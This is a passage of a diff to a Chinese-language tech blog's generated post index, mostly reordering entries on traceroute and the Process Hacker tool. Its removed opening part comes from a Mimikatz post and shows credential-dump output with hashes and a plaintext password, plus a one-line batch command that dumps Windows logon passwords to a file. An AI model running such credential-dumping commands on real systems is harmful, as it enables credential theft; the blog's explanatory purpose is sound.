d0e9aee149655a6075e4540af1f22d3b</span><br><span class="line">         * NTLM     : cc36cf7a8514893efccd332446158b1a</span><br><span class="line">         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30</span><br><span class="line">        tspkg :</span><br><span class="line">         * Username : Gentil Kiwi</span><br><span class="line">         * Domain   : vm-w7-ult-x</span><br><span class="line">         * Password : waza1234/</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h1 id="快速達成目標"><a href="#快速達成目標" class="headerlink" title="快速達成目標"></a>快速達成目標</h1><p>bat file</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt;&gt; c:\info.txt</span><br></pre></td></tr></table></figure>
-
-<p>參考資料 :<br><a href="https://jameshclai.blogspot.com/2013/03/mimikatz-windows.html">https://jameshclai.blogspot.com/2013/03/mimikatz-windows.html</a><br><a href="https://ithelp.ithome.com.tw/articles/10217688">https://ithelp.ithome.com.tw/articles/10217688</a><br><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a><br><a href="https://docs.microsoft.com/zh-tw/defender-for-identity/playbook-lateral-movement">https://docs.microsoft.com/zh-tw/defender-for-identity/playbook-lateral-movement</a><br><a href="https://www.twblogs.net/a/5b822de72b717737e032d650">https://www.twblogs.net/a/5b822de72b717737e032d650</a><br><a href="https://www.nigesb.com/introduction-of-mimikatz.html">https://www.nigesb.com/introduction-of-mimikatz.html</a></p>
-]]></content>
-      <categories>
-        <category>Kali</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Minecraft - 更改版本方法</title>
     <url>/2022/06/09/minecraft-change-version/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當 Minecraft 更新了版本，<br>然而伺服器的版本是停留在舊版本，<br>而本文章是教你如果更改版本。</p>
@@ -9824,6 +9824,25 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
+    <title>Traceroute 指令 - 追蹤封包傳遞</title>
+    <url>/2022/02/03/traceroute-commands/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>簡單黎講，<br>就係睇你連線去呢個位置既時候，<br>會更 Detail 咁睇到，<br>會連到去既位置，</p>
+<p>亦既係話，<br>當如果有其他人入侵你部機，<br>例如 miti attack 你部機，<br>咁就會睇到 trace 到既位置係有唔同。<br>因為 miti attack 係會必須經過 Hacker 部機，<br>再連到你上網既位置。</p>
+<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><p>有啲 Linux 機本身係冇裝到，<br>咁你打返呢句裝</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install traceroute -y</span><br></pre></td></tr></table></figure>
+
+<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> traceroute www.google.com</span></span><br><span class="line">traceroute to www.google.com (1.1.1.1), 30 hops max, 60 byte packets</span><br><span class="line"> 1  _gateway (10.0.0.0)  0.367 ms  0.350 ms  0.342 ms</span><br><span class="line"> 2  * * *</span><br><span class="line"> 3  * * *</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.ltsplus.com/linux/traceroute-command">https://www.ltsplus.com/linux/traceroute-command</a></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ubuntu - 查背景圖片位置</title>
     <url>/2021/12/20/ubuntu-findout-location-paths-desktop-images/</url>
     <content><![CDATA[<h1 id="點查"><a href="#點查" class="headerlink" title="點查 ?"></a>點查 ?</h1><p>開 Terminal 打</p>
@@ -9839,25 +9858,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
 ]]></content>
       <categories>
         <category>Ubuntu</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Traceroute 指令 - 追蹤封包傳遞</title>
-    <url>/2022/02/03/traceroute-commands/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>簡單黎講，<br>就係睇你連線去呢個位置既時候，<br>會更 Detail 咁睇到，<br>會連到去既位置，</p>
-<p>亦既係話，<br>當如果有其他人入侵你部機，<br>例如 miti attack 你部機，<br>咁就會睇到 trace 到既位置係有唔同。<br>因為 miti attack 係會必須經過 Hacker 部機，<br>再連到你上網既位置。</p>
-<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><p>有啲 Linux 機本身係冇裝到，<br>咁你打返呢句裝</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install traceroute -y</span><br></pre></td></tr></table></figure>
-
-<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> traceroute www.google.com</span></span><br><span class="line">traceroute to www.google.com (1.1.1.1), 30 hops max, 60 byte packets</span><br><span class="line"> 1  _gateway (10.0.0.0)  0.367 ms  0.350 ms  0.342 ms</span><br><span class="line"> 2  * * *</span><br><span class="line"> 3  * * *</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.ltsplus.com/linux/traceroute-command">https://www.ltsplus.com/linux/traceroute-command</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
       </categories>
       <tags>
         <tag>指令</tag>
@@ -10261,45 +10261,6 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </tags>
   </entry>
   <entry>
-    <title>Windows - Process Hacker 監控系統資源的工具</title>
-    <url>/2022/01/09/windows-Process-Hacker-tools/</url>
-    <content><![CDATA[<img src="/2022/01/09/windows-Process-Hacker-tools/ProcessHacker.png" class="">
-
-<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p><a href="https://processhacker.sourceforge.io/">Process Hacker</a>是一款免費、強大、多用途的工具，可幫助您監控系統資源、調試軟件和檢測惡意軟件。<br>Github : <a href="https://github.com/processhacker/processhacker">https://github.com/processhacker/processhacker</a></p>
-<h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><ul>
-<li>A detailed overview of system activity with highlighting.</li>
-<li>Graphs and statistics allow you quickly to track down resource hogs and runaway processes.</li>
-<li>Can’t edit or delete a file? Discover which processes are using that file.</li>
-<li>See what programs have active network connections, and close them if necessary.</li>
-<li>Get real-time information on disk access.</li>
-<li>View detailed stack traces with kernel-mode, WOW64 and .NET support.</li>
-<li>Go beyond services.msc: create, edit and control services.</li>
-<li>Small, portable and no installation required.</li>
-<li>100% Free Software (GPL v3)</li>
-</ul>
-<h2 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h2><p>如果您從 USB 驅動器運行 Process Hacker，您可能還希望將 Process Hacker 的設置保存在那裡。 為此，請在與 ProcessHacker.exe 相同的目錄中創建一個名為“ProcessHacker.exe.settings.xml”的空白文件。 您可以使用 Windows 資源管理器執行此操作：</p>
-<p>確保在“工具”&gt;“文件夾選項”&gt;“查看”中取消選中“隱藏已知文件類型的擴展名”。<br>右鍵單擊文件夾並選擇新建 &gt; 文本文檔。<br>將文件重命名為 ProcessHacker.exe.settings.xml（刪除 “.txt”）。 </p>
-<h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><p>可以從 Hacker &gt; Plugins 配置插件。<br>如果您遇到任何涉及插件的崩潰，請確保它們是最新的。<br>ExtendedTools 插件提供的磁盤和網絡信息僅在以管理權限運行 Process Hacker 時可用。 </p>
-<h2 id="KProcessHacker"><a href="#KProcessHacker" class="headerlink" title="KProcessHacker"></a>KProcessHacker</h2><p>Process Hacker 使用內核模式驅動程序 KProcessHacker 來協助某些功能，包括：</p>
-<ul>
-<li>捕獲內核模式堆棧跟踪</li>
-<li>更有效地枚舉進程句柄</li>
-<li>檢索文件句柄的名稱</li>
-<li>檢索 EtwRegistration 對象的名稱</li>
-<li>設置句柄屬性 </li>
-</ul>
-<h3 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h3><img src="/2022/01/09/windows-Process-Hacker-tools/program1.png" class="">
-
-<h1 id="站長的話"><a href="#站長的話" class="headerlink" title="站長的話"></a>站長的話</h1><p>呢個Program 絕對係嬴 Windows 本身個 Task manager 十條街。呀唔係，係100條街…<br>我自己都用左佢幾年，非常之咁推薦大家使用，我自己係 replace 左本身 windows 個 task manager既。<br>另外，你唔鐘意既話，係可以開返本身 windows 個 task manager 既。<br>但係注意，個濕鳩 Windows Defender 係有機會話呢個 Program 係<code>有毒</code>。</p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>指令</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Windows - ScreenToGif 錄影畫面轉為 Gif 既工具</title>
     <url>/2022/01/18/windows-ScreenToGif/</url>
     <content><![CDATA[<img src="/2022/01/18/windows-ScreenToGif/logo.png" class="">
@@ -10356,6 +10317,45 @@ to distributed teams, mobile workers and your gamer friends alike. In minutes
       </categories>
       <tags>
         <tag>系統</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows - Process Hacker 監控系統資源的工具</title>
+    <url>/2022/01/09/windows-Process-Hacker-tools/</url>
+    <content><![CDATA[<img src="/2022/01/09/windows-Process-Hacker-tools/ProcessHacker.png" class="">
+
+<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p><a href="https://processhacker.sourceforge.io/">Process Hacker</a>是一款免費、強大、多用途的工具，可幫助您監控系統資源、調試軟件和檢測惡意軟件。<br>Github : <a href="https://github.com/processhacker/processhacker">https://github.com/processhacker/processhacker</a></p>
+<h1 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h1><ul>
+<li>A detailed overview of system activity with highlighting.</li>
+<li>Graphs and statistics allow you quickly to track down resource hogs and runaway processes.</li>
+<li>Can’t edit or delete a file? Discover which processes are using that file.</li>
+<li>See what programs have active network connections, and close them if necessary.</li>
+<li>Get real-time information on disk access.</li>
+<li>View detailed stack traces with kernel-mode, WOW64 and .NET support.</li>
+<li>Go beyond services.msc: create, edit and control services.</li>
+<li>Small, portable and no installation required.</li>
+<li>100% Free Software (GPL v3)</li>
+</ul>
+<h2 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h2><p>如果您從 USB 驅動器運行 Process Hacker，您可能還希望將 Process Hacker 的設置保存在那裡。 為此，請在與 ProcessHacker.exe 相同的目錄中創建一個名為“ProcessHacker.exe.settings.xml”的空白文件。 您可以使用 Windows 資源管理器執行此操作：</p>
+<p>確保在“工具”&gt;“文件夾選項”&gt;“查看”中取消選中“隱藏已知文件類型的擴展名”。<br>右鍵單擊文件夾並選擇新建 &gt; 文本文檔。<br>將文件重命名為 ProcessHacker.exe.settings.xml（刪除 “.txt”）。 </p>
+<h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><p>可以從 Hacker &gt; Plugins 配置插件。<br>如果您遇到任何涉及插件的崩潰，請確保它們是最新的。<br>ExtendedTools 插件提供的磁盤和網絡信息僅在以管理權限運行 Process Hacker 時可用。 </p>
+<h2 id="KProcessHacker"><a href="#KProcessHacker" class="headerlink" title="KProcessHacker"></a>KProcessHacker</h2><p>Process Hacker 使用內核模式驅動程序 KProcessHacker 來協助某些功能，包括：</p>
+<ul>
+<li>捕獲內核模式堆棧跟踪</li>
+<li>更有效地枚舉進程句柄</li>
+<li>檢索文件句柄的名稱</li>
+<li>檢索 EtwRegistration 對象的名稱</li>
+<li>設置句柄屬性 </li>
+</ul>
+<h3 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h3><img src="/2022/01/09/windows-Process-Hacker-tools/program1.png" class="">
+
+<h1 id="站長的話"><a href="#站長的話" class="headerlink" title="站長的話"></a>站長的話</h1><p>呢個Program 絕對係嬴 Windows 本身個 Task manager 十條街。呀唔係，係100條街…<br>我自己都用左佢幾年，非常之咁推薦大家使用，我自己係 replace 左本身 windows 個 task manager既。<br>另外，你唔鐘意既話，係可以開返本身 windows 個 task manager 既。<br>但係注意，個濕鳩 Windows Defender 係有機會話呢個 Program 係<code>有毒</code>。</p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>指令</tag>
       </tags>
   </entry>
   <entry>
